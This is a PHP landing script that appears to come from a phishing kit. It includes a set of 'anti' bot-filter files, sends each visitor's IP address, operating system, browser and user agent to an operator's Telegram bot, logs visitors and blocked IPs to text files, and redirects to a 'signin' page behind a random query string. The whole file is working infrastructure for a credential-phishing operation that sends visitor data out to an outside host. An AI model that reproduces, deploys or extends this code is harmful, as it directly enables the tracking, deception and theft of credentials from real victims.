<?php
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti6.php"; 
include "anti/anti7.php"; 
include "anti/anti8.php"; 
include "myconfig/telegram.php";
include "myconfig/settings.php";
if ($send_logs == 1) {
    foreach ($IdTelegram_logs as $chatId) {
        $message = "[=====> LOG  <=====]\n\n";
        $message .= "[ 🔍 IP :    " . $ip . "\n";
        $message .= "[ 🌐 OS :    " . $user_os . "\n";
        $message .= "[ 🌐 Browser :    " . $user_browser . "\n";
        $message .= "[ 🌐 UA :    " . $_SERVER["HTTP_USER_AGENT"] . "\n\n";
        $website = "https://api.telegram.org/bot" . $botToken_logs;
        $params = [
            "chat_id" => $chatId,
            "text" => $message,
        ];
        $ch = curl_init($website . "/sendMessage");
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }
}
$block_list = file_get_contents("blocks.txt");
$ip_address = $_SERVER["REMOTE_ADDR"];
if (strpos($block_list, $ip_address) !== false) {
    $file = fopen("blocked.txt", "a");
    $txt = $ip_address . " | " . date("Y-m-d h:i:s");
    fwrite($file, $txt . "\n");
    fclose($file);
    echo "You are not allowed to access this site.";
    exit();
}
  $randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 20, 100);
$file2 = fopen("visitors.txt", "a");
    $txt = $ip_address . " | " . date("Y-m-d h:i:s");
    fwrite($file2, $txt . "\n");
    fclose($file2);
echo "<script>window.location = 'signin?".$randomString."'</script>";
